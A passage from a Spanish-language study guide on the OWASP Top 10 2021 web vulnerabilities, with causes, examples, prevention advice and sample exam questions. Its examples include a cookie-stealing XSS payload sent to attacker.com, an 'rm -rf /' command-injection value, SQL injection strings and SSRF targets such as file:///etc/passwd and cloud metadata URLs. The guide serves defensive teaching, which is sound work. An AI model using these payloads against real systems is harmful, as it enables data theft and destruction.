                          Autenticación)          implementadas
                                                  incorrectamente.

  A08:2021                Software and Data       Código e
                          Integrity Failures      infraestructura que no
                          (Fallos de Integridad   protegen contra
                          de Software y Datos)    violaciones de
                                                  integridad (ej.
                                                  deserialización
                                                  insegura,
                                                  actualizaciones no
                                                  seguras).

  A09:2021                Security Logging and    Registro, detección,
                          Monitoring Failures     monitoreo y respuesta
                          (Fallos de Registro y   activa a incidentes
                          Monitoreo de Seguridad) insuficientes.

  A10:2021                Server-Side Request     Fallos que permiten a
                          Forgery (SSRF)          un atacante inducir a
                                                  la aplicación del lado
                                                  del servidor a realizar
                                                  solicitudes a un
                                                  dominio inesperado.

  *Fuente: \[23\]*                                
  ----------------------- ----------------------- -----------------------

### 4.3. Análisis Detallado de las Vulnerabilidades del OWASP Top 10 2021

A continuación, se detalla cada una de las vulnerabilidades del OWASP
Top 10 2021:

- **A01:2021-Broken Access Control (Control de Acceso Roto)**

  - **Descripción:** Esta vulnerabilidad ocurre cuando las restricciones
    sobre lo que un usuario autenticado tiene permitido hacer no se
    aplican correctamente. Los atacantes pueden explotar estos fallos
    para acceder a funcionalidades y/o datos no autorizados, como
    acceder a cuentas de otros usuarios, ver archivos sensibles, o
    modificar datos y derechos de acceso de otros usuarios.\[23, 26\] Es
    la categoría con el riesgo de seguridad más grave según los datos de
    2021.\[23\]

  - **Cómo Ocurre:** Fallos en la validación de permisos a nivel de
    función o datos, manipulación de parámetros (URL, cookies, campos
    ocultos) para eludir chequeos, Insecure Direct Object References
    (IDOR), permisos excesivos por defecto, errores en la lógica de
    aplicación de controles de acceso en flujos de trabajo o APIs.\[12,
    26\]

  - **Ejemplos:**

    - Un usuario accede a https://example.com/app/accountInfo?acct=123.
      Cambiando acct=124 puede ver la información de otra cuenta.

    - Un usuario normal accede a una URL de administración
      (/admin/deleteUser) que no está protegida o cuyo chequeo de rol es
      defectuoso.\[12\]

    - Escalada de privilegios vertical (usuario normal a admin) u
      horizontal (usuario A accede a datos de usuario B del mismo
      nivel).\[12, 26\]

  - **Prevención:**

    - Implementar controles de acceso basados en el principio de mínimo
      privilegio.

    - Centralizar la lógica de control de acceso y hacerla cumplir en el
      lado del servidor para todas las solicitudes.\[12\]

    - Modelar los controles de acceso para que denieguen por defecto.

    - Validar los derechos de acceso en cada función que acceda a datos
      o ejecute acciones.

    - Usar tokens de acceso o identificadores de sesión para verificar
      permisos, no parámetros controlables por el cliente.

    - Invalidar tokens de sesión después del logout y en timeouts.

    - Implementar Role-Based Access Control (RBAC) o Attribute-Based
      Access Control (ABAC) de forma consistente.\[26\]

    - Registrar los fallos de control de acceso y alertar si es
      apropiado.

- **A02:2021-Cryptographic Failures (Fallos Criptográficos)**

  - **Descripción:** Anteriormente conocida como \"Exposición de Datos
    Sensibles\", esta categoría se enfoca en la causa raíz: fallos
    relacionados con la criptografía o su ausencia. Estos fallos pueden
    llevar a la exposición de datos sensibles o al compromiso del
    sistema.\[23, 27\]

  - **Cómo Ocurre:**

    - Datos sensibles transmitidos en texto claro (ej. HTTP, SMTP,
      FTP).\[28\]

    - Uso de algoritmos criptográficos débiles, obsoletos o inseguros
      (ej. DES, RC4, MD5/SHA1 para hashing de contraseñas).\[27, 28\]

    - Gestión de claves deficiente: claves débiles, por defecto,
      hardcodeadas, almacenadas de forma insegura, o no rotadas.\[27,
      28\]

    - No cifrar datos sensibles en reposo (ej. en bases de datos,
      archivos) o hacerlo con métodos débiles.

    - Uso incorrecto de primitivas criptográficas, como vectores de
      inicialización (IVs) estáticos, predecibles o reutilizados.\[27,
      28\]

    - Almacenamiento de contraseñas en texto plano, o con hashes simples
      (no salteados y/o no lentos).\[27\]

    - CWEs comunes: CWE-259 (Uso de Contraseñas Hardcodeadas), CWE-331
      (Entropía Insuficiente), CWE-327 (Uso de Algoritmo Criptográfico
      Roto o Arriesgado).\[27\]

  - **Ejemplos:**

    - Un sitio web que transmite credenciales de inicio de sesión sobre
      HTTP.\[28\]

    - Una aplicación que almacena números de tarjetas de crédito en una
      base de datos cifrados con DES.\[28\]

    - Claves de cifrado embebidas directamente en el código fuente o
      archivos de configuración.\[28\]

    - Uso de rand() para generar claves criptográficas en lugar de un
      CSPRNG.\[28\]

  - **Prevención:**

    - Clasificar los datos procesados, almacenados o transmitidos;
      identificar datos sensibles y aplicar controles acordes.\[27\]

    - No almacenar datos sensibles innecesariamente. Considerar
      tokenización o truncamiento.\[27\]

    - Cifrar todos los datos sensibles en tránsito (usar TLS 1.2+ con
      HSTS y forward secrecy) y en reposo (usar algoritmos estándar
      fuertes como AES-256).\[27\]

    - Implementar una gestión de claves robusta (generación,
      distribución, almacenamiento, rotación, destrucción).

    - Usar hashes fuertes, salteados y adaptativos (ej. Argon2, scrypt,
      bcrypt, PBKDF2) para el almacenamiento de contraseñas.\[27\]

    - Asegurar que los IVs sean únicos y aleatorios (CSPRNG) para cada
      cifrado con la misma clave, según el modo de operación.\[27\]

    - Evitar algoritmos y protocolos criptográficos obsoletos (MD5,
      SHA1, SSLv3, TLS 1.0/1.1).\[28\]

    - Verificar regularmente la efectividad de las configuraciones
      criptográficas.\[27\]

- **A03:2021-Injection (Inyección)**

  - **Descripción:** Las fallas de inyección ocurren cuando datos no
    confiables se envían a un intérprete como parte de un comando o
    consulta. Los datos hostiles suministrados por el atacante pueden
    engañar al intérprete para que ejecute comandos no intencionados o
    acceda a datos sin la debida autorización.\[23, 29\] Esta categoría
    incluye Cross-Site Scripting (XSS) en la edición 2021.\[23\] Los
    tipos comunes son SQL, NoSQL, OS command, ORM, LDAP, y Expression
    Language (EL) o Object Graph Navigation Library (OGNL)
    injection.\[29\]

  - **Cómo Ocurre:**

    - Datos suministrados por el usuario no son validados, filtrados o
      sanitizados por la aplicación.\[29\]

    - Consultas dinámicas o llamadas no parametrizadas sin escape
      sensible al contexto se usan directamente en el intérprete.\[29\]

    - Datos hostiles se usan dentro de parámetros de búsqueda de
      Object-Relational Mapping (ORM) para extraer registros adicionales
      y sensibles.\[29\]

    - Datos hostiles se usan directamente o se concatenan en consultas
      dinámicas, comandos o procedimientos almacenados.\[29\]

  - **Ejemplos:**

    - **SQL Injection:** Un atacante modifica un parámetro id en una URL
      de http://example.com/app/accountView?id=123 a
      http://example.com/app/accountView?id=\' UNION SELECT
      SLEEP(10);\-- para hacer que la base de datos espere 10 segundos,
      confirmando la vulnerabilidad.\[29\]

    - **Cross-Site Scripting (XSS):** Un atacante introduce
      \<script\>document.location=\'http://attacker.com/steal_cookie.php?cookie=\'+document.cookie\</script\>
      en un campo de comentario que luego se muestra a otros usuarios
      sin la debida sanitización.\[30\]

    - **Command Injection:** Una aplicación permite al usuario
      especificar un nombre de archivo para listar, y el atacante
      ingresa filename.txt; rm -rf /.\[30\]

  - **Prevención:**

    - La opción preferida es usar APIs seguras que eviten el uso del
      intérprete por completo, proporcionen una interfaz parametrizada o
      migren a Herramientas de Mapeo Objeto-Relacional (ORMs).\[4, 29\]

    - Usar validación de entradas positiva del lado del servidor. Esto
      no es una defensa completa, ya que muchas aplicaciones requieren
      caracteres especiales.\[29\]

    - Para cualquier consulta dinámica residual, escapar los caracteres
      especiales usando la sintaxis de escape específica para ese
      intérprete.\[4, 29\]

    - Usar LIMIT y otros controles SQL dentro de las consultas para
      prevenir la divulgación masiva de registros en caso de SQL
      injection.\[4, 29\]

    - Para XSS, usar codificación de salida contextual (ej. HtmlEncode
      de bibliotecas como AntiXSS de Microsoft) y políticas de seguridad
      de contenido (CSP).\[30\]

    - Separar los datos de los comandos y consultas.\[4\]

- **A04:2021-Insecure Design (Diseño Inseguro)**

  - **Descripción:** Esta es una nueva categoría en 2021 que se enfoca
    en riesgos relacionados con fallas en el diseño y la arquitectura.
    Un diseño inseguro no puede ser corregido por una implementación
    perfecta, ya que, por definición, los controles de seguridad
    necesarios nunca fueron creados para defenderse contra ataques
    específicos.\[23, 31\]

  - **Cómo Ocurre:** Falta de perfilado del riesgo del negocio inherente
    al software o sistema que se está desarrollando, y por lo tanto, la
    falla en determinar qué nivel de diseño de seguridad se
    requiere.\[31\] Falta de modelado de amenazas, no usar patrones de
    diseño seguro, no considerar flujos de fallo o estados inseguros, o
    hacer suposiciones incorrectas sobre la confianza o el
    comportamiento del usuario.\[31, 32\] CWEs notables incluyen CWE-209
    (Generación de Mensaje de Error Conteniendo Información Sensible),
    CWE-256 (Almacenamiento No Protegido de Credenciales), CWE-501
    (Violación de Límite de Confianza).\[31\]

  - **Ejemplos:**

    - Un flujo de recuperación de credenciales que utiliza \"preguntas y
      respuestas\" como único factor, lo cual está prohibido por NIST
      800-63b porque las respuestas pueden ser conocidas por múltiples
      personas.\[31\]

    - Un sistema de reservas de cine que no limita la cantidad de
      asientos que un usuario puede reservar, permitiendo a un atacante
      bloquear todos los asientos y causar una pérdida de
      ingresos.\[31\]

    - Un sitio de comercio electrónico sin protección contra bots que
      compran productos de alta demanda (ej. tarjetas de video) para
      revenderlos, dañando la reputación y la relación con los
      clientes.\[31\]

    - La vulnerabilidad Heartbleed en OpenSSL, causada por un error de
      programación (falta de validación de límites) en una
      característica de diseño (heartbeat).\[32\]

  - **Prevención:**

    - Establecer y utilizar un ciclo de vida de desarrollo seguro con
      profesionales de seguridad.\[31\]

    - Usar modelado de amenazas para flujos críticos de autenticación,
      control de acceso, lógica de negocio y flujos clave.\[31, 32\]

    - Integrar lenguaje y controles de seguridad en las historias de
      usuario y criterios de aceptación.

    - Utilizar patrones de diseño seguro y arquitecturas de referencia
      probadas.

    - Realizar chequeos de plausibilidad en cada capa de la aplicación
      (frontend a backend).\[31\]

    - Escribir pruebas unitarias y de integración para validar que todos
      los flujos críticos son resistentes al modelo de amenazas.\[31\]

    - Segregar las capas del sistema y de la red según la exposición y
      las necesidades de protección.\[31\]

    - Limitar el consumo de recursos por usuario o servicio.\[31\]

- **A05:2021-Security Misconfiguration (Configuración de Seguridad
  Incorrecta)**

  - **Descripción:** Esta categoría asciende desde la posición #6 en la
    edición anterior. Incluye configuraciones de seguridad inseguras por
    defecto, configuraciones incompletas o ad hoc, mensajes de error
    demasiado detallados que revelan información sensible, servicios o
    características innecesarias habilitadas, y parches de seguridad no
    aplicados.\[23, 33, 34\] La antigua categoría A4:2017-XML External
    Entities (XXE) ahora es parte de esta categoría.\[23\]

  - **Cómo Ocurre:**

    - Características o servicios innecesarios (puertos, páginas,
      cuentas, privilegios) habilitados o instalados.\[33\]

    - Cuentas por defecto y sus contraseñas permanecen sin cambios.\[33,
      34\]

    - Manejo de errores que revela información sensible (stack traces,
      mensajes detallados).\[33, 34\]

    - No aplicar parches de seguridad o actualizaciones de software de
      manera oportuna.\[33, 34\]

    - Analizadores XML mal configurados que procesan entidades externas
      en documentos XML (XXE).\[33\]

    - Listado de directorios habilitado en el servidor web.\[34\]

    - Cabeceras de seguridad HTTP faltantes o mal configuradas.

  - **Ejemplos:**

    - Un servidor de aplicaciones con una consola de administración
      habilitada con credenciales por defecto.\[34\]

    - Un mensaje de error que muestra la consulta SQL completa que
      falló.

    - Un servidor web que permite el listado de directorios, revelando
      la estructura de archivos.\[34\]

    - Explotación de una vulnerabilidad XXE para leer archivos internos
      del servidor, como /etc/passwd.\[33\]

    - Software desactualizado con vulnerabilidades conocidas
      públicamente.\[34\]

  - **Prevención:**

    - Implementar un proceso de \"hardening\" repetible y automatizado
      para configurar los entornos de desarrollo, QA y producción de
      manera idéntica (con diferentes credenciales).\[34\]

    - Construir una plataforma mínima, deshabilitando o desinstalando
      todas las características, componentes, documentación y muestras
      innecesarias.\[34\]

    - Revisar y actualizar las configuraciones de seguridad de todos los
      componentes de la aplicación (frameworks, servidor de
      aplicaciones, base de datos, etc.) de acuerdo con las guías de
      \"hardening\" y aplicar parches y actualizaciones de seguridad
      como parte de un proceso de gestión de parches.\[34\]

    - Implementar una arquitectura de aplicación segmentada para
      proporcionar una separación efectiva y segura entre
      componentes.\[34\]

    - Configurar el manejo de errores para que registre información
      detallada solo en logs del lado del servidor y muestre mensajes
      genéricos a los usuarios.

    - Para XXE, deshabilitar el procesamiento de entidades externas XML
      o usar analizadores configurados de forma segura.

- **A06:2021-Vulnerable and Outdated Components (Componentes Vulnerables
  y Desactualizados)**

  - **Descripción:** Anteriormente titulada \"Uso de Componentes con
    Vulnerabilidades Conocidas\". Este riesgo se refiere al uso de
    librerías, frameworks y otros módulos de software que tienen
    vulnerabilidades de seguridad conocidas o que están desactualizados
    y ya no reciben soporte ni parches.\[23, 24, 35\]

  - **Cómo Ocurre:**

    - No mantener un inventario de los componentes de terceros
      utilizados y sus versiones.\[35\]

    - No escanear los componentes en busca de vulnerabilidades conocidas
      (usando herramientas de Software Composition Analysis - SCA).

    - No actualizar o parchear los componentes cuando se descubren
      vulnerabilidades.\[35\]

    - Usar software que ya no es mantenido por sus desarrolladores
      (End-of-Life).\[35\]

    - Dependencias anidadas (componentes que dependen de otros
      componentes) que pueden introducir vulnerabilidades
      indirectamente.

  - **Ejemplos:**

    - La brecha de Equifax en 2017, donde los atacantes explotaron una
      vulnerabilidad conocida en Apache Struts, un framework de
      desarrollo web.\[35\]

    - El ataque de ransomware WannaCry en 2017, que explotó una
      vulnerabilidad en Microsoft Windows que había sido parcheada meses
      antes, pero muchos sistemas no habían sido actualizados.\[35\]

    - Usar una versión antigua de una librería JavaScript con una
      vulnerabilidad XSS conocida.

  - **Prevención:**

    - Mantener un inventario de todos los componentes de terceros y sus
      versiones.\[35\]

    - Escanear regularmente las aplicaciones en busca de componentes
      vulnerables utilizando herramientas SCA.\[24\]

    - Monitorear boletines de seguridad y avisos de los desarrolladores
      de los componentes.\[35\]

    - Aplicar parches y actualizaciones de seguridad prontamente.
      Establecer un proceso de gestión de parches.\[35\]

    - Utilizar solo componentes que estén activamente mantenidos por sus
      desarrolladores y que provengan de fuentes oficiales.\[35\]

    - Remover dependencias y características no utilizadas para reducir
      la superficie de ataque.

    - Considerar el uso de parches virtuales a través de un Web
      Application Firewall (WAF) como una medida temporal mientras se
      aplican las actualizaciones permanentes.\[24\]

- **A07:2021-Identification and Authentication Failures (Fallos de
  Identificación y Autenticación)**

  - **Descripción:** Anteriormente conocida como \"Autenticación Rota\",
    esta categoría ha descendido desde la segunda posición e incluye
    CWEs relacionados con fallos en la identificación del usuario.\[23,
    36\] Se refiere a debilidades en cómo la aplicación confirma la
    identidad del usuario, gestiona las sesiones y protege las
    credenciales.

  - **Cómo Ocurre:**

    - Permitir ataques automatizados como credential stuffing (uso de
      listas de credenciales robadas) o brute force (probar múltiples
      contraseñas) debido a la falta de límites de intentos o
      CAPTCHAs.\[36, 37\]

    - Permitir contraseñas por defecto, débiles o bien conocidas (ej.
      \"Password1\", \"admin/admin\").\[36, 37\]

    - Procesos de recuperación de credenciales débiles o ineficaces (ej.
      preguntas de seguridad cuyas respuestas son fáciles de adivinar o
      encontrar).\[36, 37\]

    - Almacenamiento de contraseñas en texto plano, cifradas
      reversiblemente o con hashes débiles (ver A02:2021-Fallos
      Criptográficos).\[36, 37\]

    - Autenticación multifactor (MFA) ausente o implementada de forma
      ineficaz.\[36, 37\]

    - Exposición de identificadores de sesión en la URL.\[36, 37\]

    - Reutilización de identificadores de sesión después de un inicio de
      sesión exitoso (riesgo de fijación de sesión).\[36\]

    - No invalidar correctamente los IDs de sesión después del logout, o
      por inactividad o timeouts absolutos.\[36, 37\]

    - CWEs notables: CWE-287 (Autenticación Incorrecta), CWE-384
      (Fijación de Sesión), CWE-297 (Validación Incorrecta de
      Certificado con Desajuste de Host).\[36\]

  - **Ejemplos:**

    - Una aplicación que no bloquea una cuenta después de múltiples
      intentos fallidos de inicio de sesión, permitiendo un ataque de
      fuerza bruta.\[36\]

    - Un sitio que permite a los usuarios establecer \"123456\" como
      contraseña.\[37\]

    - Un usuario cierra la pestaña del navegador en una computadora
      pública sin cerrar sesión, y un atacante usa el mismo navegador
      una hora después y encuentra que la sesión sigue activa.\[36\]

    - Un ID de sesión enviado como GET /?sessionid=abcdef123456.

  - **Prevención:**

    - Implementar MFA siempre que sea posible.\[36, 37\]

    - No enviar ni desplegar aplicaciones con credenciales por defecto,
      especialmente para usuarios administradores.\[36, 37\]

    - Implementar chequeos de contraseñas débiles (ej. contra listas de
      las peores contraseñas).\[36, 37\]

    - Alinear las políticas de longitud, complejidad y rotación de
      contraseñas con las directrices de NIST 800-63b (énfasis en
      longitud y evitar contraseñas comunes, menos en rotación frecuente
      si hay MFA).\[36, 37\]

    - Endurecer los procesos de registro, recuperación de credenciales y
      vías de API contra ataques de enumeración de cuentas (usar
      mensajes consistentes para todos los resultados).\[36, 37\]

    - Limitar o retrasar progresivamente los intentos fallidos de inicio
      de sesión. Registrar todos los fallos y alertar a los
      administradores sobre posibles ataques.\[36, 37\]

    - Usar un gestor de sesiones seguro, del lado del servidor,
      incorporado, que genere nuevos IDs de sesión aleatorios con alta
      entropía después del inicio de sesión. Los IDs de sesión no deben
      estar en la URL, deben almacenarse de forma segura e invalidarse
      después del logout, inactividad y timeouts absolutos.\[36, 37\]

- **A08:2021-Software and Data Integrity Failures (Fallos de Integridad
  de Software y Datos)**

  - **Descripción:** Esta es una nueva categoría para 2021, enfocada en
    hacer suposiciones relacionadas con actualizaciones de software,
    datos críticos y pipelines de CI/CD sin verificar la
    integridad.\[23, 38\] Un ejemplo clave es la deserialización
    insegura, donde objetos o datos codificados o serializados en una
    estructura que un atacante puede ver y modificar son
    vulnerables.\[38, 39\]

  - **Cómo Ocurre:**

    - La aplicación depende de plugins, librerías o módulos de fuentes,
      repositorios y redes de entrega de contenido (CDNs) no confiables
      sin verificación de integridad.\[38\]

    - Un pipeline de CI/CD inseguro puede introducir la posibilidad de
      acceso no autorizado, código malicioso o compromiso del
      sistema.\[38\]

    - Funcionalidad de auto-actualización que descarga e instala
      actualizaciones sin una verificación de integridad suficiente (ej.
      firma digital).\[38\]

    - Deserialización de datos u objetos serializados que han sido
      manipulados por un atacante, llevando a ejecución remota de código
      (RCE) u otros impactos.

  - **Ejemplos:**

    - Muchos routers domésticos, decodificadores y firmware de
      dispositivos no verifican las actualizaciones mediante firmware
      firmado, lo que los hace un objetivo para los atacantes.\[38\]

    - El ataque a SolarWinds, donde los atacantes comprometieron el
      mecanismo de actualización para distribuir una actualización
      maliciosa a miles de organizaciones.\[38\]

    - Una aplicación React que llama a microservicios Spring Boot
      serializa el estado del usuario y lo pasa de un lado a otro. Un
      atacante nota la firma de objeto Java (rO0) en Base64 y usa
      herramientas como Java Serial Killer para lograr RCE en el
      servidor de la aplicación.\[38\]

    - Una API que permite enviar pedidos como objetos JSON (orderLines)
      pero también como una cadena (orderLinesData) que puede contener
      JSON arbitrario. Un atacante podría enviar un payload de
      deserialización JSON inseguro para un ataque DoS, como (function
      dos() { while(true); })().\[39\]

  - **Prevención:**

    - Usar firmas digitales o mecanismos similares para verificar que el
      software o los datos provienen de la fuente esperada y no han sido
      alterados.\[38\]

    - Asegurar que las librerías y dependencias (ej. de npm o Maven) se
      consuman de repositorios confiables. Considerar alojar un
      repositorio interno validado para perfiles de alto riesgo.\[38\]

    - Utilizar herramientas de seguridad de la cadena de suministro de
      software (ej. OWASP Dependency Check, OWASP CycloneDX) para
      verificar que los componentes no contengan vulnerabilidades
      conocidas.\[38\]

    - Asegurar que exista un proceso de revisión para los cambios de
      código y configuración para minimizar la posibilidad de que se
      introduzca código o configuración maliciosa en el pipeline de
      software.\[38\]

    - Asegurar que el pipeline de CI/CD tenga una segregación,
      configuración y control de acceso adecuados para garantizar la
      integridad del código que fluye a través de los procesos de
      construcción y despliegue.\[38\]

    - Asegurar que los datos serializados no firmados o no cifrados no
      se envíen a clientes no confiables sin alguna forma de
      verificación de integridad o firma digital para detectar la
      manipulación o reproducción de los datos serializados.\[38\]

    - Configurar políticas de WAF para bloquear patrones de ataque de
      deserialización conocidos.\[39\]

- **A09:2021-Security Logging and Monitoring Failures (Fallos de
  Registro y Monitoreo de Seguridad)**

  - **Descripción:** Esta categoría, que regresa al Top 10, es crucial
    para detectar, escalar y responder a brechas activas. Sin registro y
    monitoreo, las brechas no pueden detectarse o se detectan con mucho
    retraso.\[40\] Incluye CWE-778 (Registro Insuficiente), CWE-117
    (Neutralización Incorrecta de Salida para Logs), CWE-223 (Omisión de
    Información Relevante para la Seguridad) y CWE-532 (Inserción de
    Información Sensible en Archivo de Log).\[23, 40\]

  - **Cómo Ocurre:**

    - Eventos auditables (logins, logins fallidos, transacciones de alto
      valor) no se registran.\[40, 41\]

    - Advertencias y errores generan mensajes de log nulos, inadecuados
      o poco claros.\[40\]

    - Los logs de aplicaciones y APIs no se monitorean en busca de
      actividad sospechosa.\[40\]

    - Los logs se almacenan solo localmente (vulnerables a manipulación
      o pérdida si el sistema se compromete).\[40\]

    - No existen umbrales de alerta y procesos de escalada de respuesta
      apropiados o efectivos.\[40\]

    - Las pruebas de penetración y los escaneos de DAST (como OWASP ZAP)
      no activan alertas.\[40\]

    - La aplicación no puede detectar, escalar o alertar sobre ataques
      activos en tiempo real o casi real.\[40\]

    - Fuga de información al hacer visibles los eventos de registro y
      alerta a un usuario o atacante.\[40\]

  - **Ejemplos:**

    - El operador del sitio web de un proveedor de planes de salud para
      niños no pudo detectar una brecha debido a la falta de monitoreo y
      registro. Un tercero externo informó al proveedor que un atacante
      había accedido y modificado miles de registros de salud sensibles
      de más de 3.5 millones de niños.\[40\]

    - Una aerolínea europea importante sufrió una brecha reportable bajo
      GDPR. La brecha fue causada por vulnerabilidades de seguridad en
      la aplicación de pagos explotadas por atacantes, quienes
      recolectaron más de 400,000 registros de pago de clientes. La
      aerolínea fue multada con 20 millones de libras.\[40\]

  - **Prevención:**

    - Asegurar que todas las fallas de inicio de sesión, control de
      acceso y validación de entrada del lado del servidor se puedan
      registrar con suficiente contexto de usuario para identificar
      cuentas sospechosas o maliciosas, y se conserven durante el tiempo
      suficiente para permitir un análisis forense diferido.\[40\]

    - Asegurar que los logs se generen en un formato que las soluciones
      de gestión de logs (ej. SIEMs) puedan consumir fácilmente.\[40,
      41\]

    - Asegurar que los datos de log se codifiquen correctamente para
      prevenir inyecciones o ataques a los sistemas de registro o
      monitoreo.\[40\]

    - Asegurar que las transacciones de alto valor tengan una pista de
      auditoría con controles de integridad para prevenir la
      manipulación o eliminación (ej. tablas de base de datos de solo
      adición).\[40\]

    - Los equipos de DevSecOps deben establecer un monitoreo y alertas
      efectivos para que las actividades sospechosas se detecten y se
      responda rápidamente.\[40, 41\]

    - Establecer o adoptar un plan de respuesta y recuperación de
      incidentes, como el NIST 800-61r2 o posterior.\[40\]

    - Revisar regularmente los logs para identificar problemas
      potenciales.\[41\]

    - Incorporar alertas automatizadas para notificar a los equipos de
      seguridad cuando ocurran eventos específicos.\[41\]

- **A10:2021-Server-Side Request Forgery (SSRF) (Falsificación de
  Solicitudes del Lado del Servidor)**

  - **Descripción:** Las fallas de SSRF ocurren siempre que una
    aplicación web obtiene un recurso remoto sin validar la URL
    suministrada por el usuario. Permite a un atacante coaccionar a la
    aplicación para que envíe una solicitud manipulada a un destino
    inesperado, incluso cuando está protegido por un firewall, VPN u
    otro tipo de lista de control de acceso a la red (ACL).\[23, 42,
    43\]

  - **Cómo Ocurre:** La aplicación web expone una funcionalidad que
    implica obtener un recurso de una URL proporcionada por el usuario
    (ej. para importar datos, generar una vista previa de un enlace,
    conectarse a un webhook). Si esta URL no se valida estrictamente, un
    atacante puede proporcionar URLs que apunten a recursos internos de
    la red del servidor o a servicios en la máquina local del
    servidor.\[42, 43\]

  - **Ejemplos:**

    - **Escaneo de puertos de servidores internos:** Un atacante puede
      hacer que la aplicación intente conectarse a diferentes IPs y
      puertos internos (ej. http://192.168.0.1:80,
      http://192.168.0.1:443, etc.) y determinar si los puertos están
      abiertos o cerrados según los resultados de la conexión o el
      tiempo transcurrido.\[42, 43\]

    - **Exposición de datos sensibles:** Acceso a archivos locales como
      file:///etc/passwd o servicios internos como
      http://localhost:28017/ (MongoDB).\[42, 43\]

    - **Acceso a metadatos de servicios en la nube:** Muchos proveedores
      de nube exponen un servicio de metadatos en una IP local especial
      (ej. http://169.254.169.254/ en AWS). Un atacante puede usar SSRF
      para leer estos metadatos y obtener información sensible como
      credenciales temporales, roles IAM, etc..\[42, 43\]

    - **Compromiso de servicios internos:** El atacante puede abusar de
      servicios internos para realizar más ataques como Ejecución Remota
      de Código (RCE) o Denegación de Servicio (DoS).\[42\]

  - **Prevención:**

    - **Desde la capa de Red:**

      - Segmentar la funcionalidad de acceso a recursos remotos en redes
        separadas para reducir el impacto de SSRF.\[42\]

      - Aplicar políticas de firewall de \"denegar por defecto\" o
        reglas de control de acceso a la red para bloquear todo el
        tráfico intraneto excepto el esencial.\[42\]

      - Registrar todos los flujos de red aceptados y bloqueados en los
        firewalls.\[42\]

    - **Desde la capa de Aplicación:**

      - Sanitizar y validar todos los datos de entrada suministrados por
        el cliente.\[42, 44\]

      - Hacer cumplir el esquema de URL, el puerto y el destino con una
        lista blanca positiva (allow list). Solo permitir esquemas
        conocidos y seguros (HTTP, HTTPS) y puertos esperados.\[42, 44\]

      - No enviar respuestas crudas de las solicitudes internas a los
        clientes.\[42, 44\]

      - Deshabilitar las redirecciones HTTP o, si son necesarias,
        validar el destino de la redirección contra la lista
        blanca.\[42, 44\]

      - Ser consciente de la consistencia de la URL para evitar ataques
        como el DNS rebinding y las condiciones de carrera \"time of
        check, time of use\" (TOCTOU).\[42\]

      - No intentar mitigar SSRF mediante el uso de una lista negra
        (deny list) o expresiones regulares, ya que los atacantes tienen
        listas de payloads y herramientas para eludirlas.\[42\]

El OWASP Top 10 2021 no es solo una lista de vulnerabilidades aisladas;
muchas de ellas están interconectadas. Por ejemplo, una A03:Injection
exitosa podría ser el resultado de una A05:Security Misconfiguration
(como permisos de base de datos demasiado amplios que permiten al
atacante leer más datos de los necesarios, o mensajes de error
detallados que revelan la estructura de la base de datos). Una vez que
un atacante explota una inyección para obtener credenciales, podría
llevar a A01:Broken Access Control si esas credenciales pertenecen a un
usuario con más privilegios, o a A02:Cryptographic Failures si los datos
obtenidos (como contraseñas hasheadas débilmente) pueden ser
descifrados. Esta interconexión subraya la necesidad de un enfoque de
defensa en profundidad. Abordar una sola categoría de manera aislada no
es suficiente. Se requiere una estrategia integral que considere el
A04:Insecure Design desde el principio, promueva prácticas de
codificación segura para mitigar A03 y A02, asegure una A05:Security
Misconfiguration robusta, gestione activamente A06:Vulnerable and
Outdated Components, implemente una A07:Identification and
Authentication Failures y A01:Broken Access Control fuertes, verifique
la A08:Software and Data Integrity Failures, y mantenga una A09:Security
Logging and Monitoring Failures y detección de A10:SSRF vigilantes. Esta
visión holística es fundamental para construir y mantener aplicaciones
web seguras en el complejo panorama de amenazas actual.

### 4.4. Posibles Preguntas y Respuestas del Examen

- **P: ¿Qué tipo de vulnerabilidad es A01:2021-Broken Access Control y
  cómo se diferencia de A07:2021-Identification and Authentication
  Failures?**

  - R: A01:Broken Access Control se refiere a fallos en la aplicación de
    políticas sobre lo que un usuario *ya autenticado* tiene permitido
    hacer (autorización). A07:Identification and Authentication Failures
    se refiere a fallos en el proceso de *verificar la identidad* del
    usuario (autenticación) o en la identificación única de un
    usuario.\[12, 23, 36, 37\]

- **P: Describa un ejemplo de ataque de Inyección SQL (A03) y una medida
  de prevención primaria.**

  - R: Ejemplo: Un atacante ingresa \' OR \'1\'=\'1\' \-- en un campo de
    nombre de usuario. Si la aplicación concatena directamente esta
    entrada en una consulta SQL, podría autenticar al atacante sin una
    contraseña válida. Prevención primaria: Usar consultas
    parametrizadas (prepared statements o parameterized queries).\[29,
    30\]

- **P: ¿Por qué el \"Diseño Inseguro\" (A04) es una categoría importante
  y difícil de solucionar posteriormente en el ciclo de vida del
  software?**

  - R: Porque si los controles de seguridad fundamentales no se
    consideran e integran desde la fase de diseño, la implementación,
    por muy perfecta que sea, no podrá compensar la ausencia de dichos
    controles. Corregir fallos de diseño en etapas tardías suele
    implicar rediseños arquitectónicos costosos y complejos.\[31\]

- **P: ¿Cuál es el riesgo principal asociado con A06:2021-Vulnerable and
  Outdated Components y cómo se puede mitigar eficazmente?**

  - R: El riesgo principal es que los componentes de terceros
    (librerías, frameworks) utilizados en la aplicación tengan
    vulnerabilidades conocidas que pueden ser explotadas por atacantes.
    Se mitiga manteniendo un inventario actualizado de todos los
    componentes, escaneándolos regularmente en busca de vulnerabilidades
    conocidas (con herramientas SCA), y aplicando parches o
    actualizaciones de manera oportuna.\[24, 35\]

- **P: Explique qué es un ataque de Server-Side Request Forgery (SSRF)
  (A10) y mencione dos formas de prevenirlo a nivel de aplicación.**

  - R: SSRF es una vulnerabilidad que permite a un atacante engañar a la
    aplicación del lado del servidor para que realice solicitudes HTTP a
    un recurso interno o externo no deseado, elegido por el atacante.
    Dos formas de prevenirlo a nivel de aplicación son: 1) Validar y
    sanitizar estrictamente la URL de entrada proporcionada por el
    usuario, permitiendo solo esquemas, dominios y puertos conocidos a
    través de una lista blanca. 2) Deshabilitar las redirecciones HTTP
    o, si son necesarias, validar que el destino de la redirección
    también esté en la lista blanca.\[42\]

## 5. Desarrollo Seguro de Aplicaciones Móviles

La proliferación de dispositivos móviles ha convertido a las
aplicaciones móviles en un componente esencial de la vida digital y,
consecuentemente, en un objetivo atractivo para los atacantes. El
proyecto OWASP Mobile Top 10 tiene como objetivo concienciar sobre los
riesgos de seguridad más críticos específicos de las aplicaciones
móviles, tanto para plataformas Android como iOS.\[45\]

### 5.1. Introducción al OWASP Mobile Top 10

Al igual que su contraparte web, el OWASP Mobile Top 10 se actualiza
periódicamente para reflejar la evolución del panorama de amenazas
móviles. La lista de 2016, por ejemplo, incluía riesgos como \"Improper
Platform Usage\" y \"Insecure Data Storage\".\[46\] La lista más
